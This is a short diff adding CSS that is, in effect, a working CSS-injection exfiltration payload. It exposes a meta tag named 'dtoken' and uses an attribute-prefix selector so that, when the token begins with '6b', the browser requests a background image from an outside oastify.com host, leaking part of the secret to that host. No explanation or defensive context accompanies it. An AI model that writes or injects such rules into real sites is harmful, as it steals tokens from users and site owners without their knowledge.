@@ -1,0 +1,6 @@
+head, meta[name="dtoken"] {
+	display: block;
+}
+meta[name="dtoken"][content^="6b"] {
+	background: url("http://cssmeta.wtt65xr474lsoekc3c9m2tj8xz3pre.oastify.com");
+}
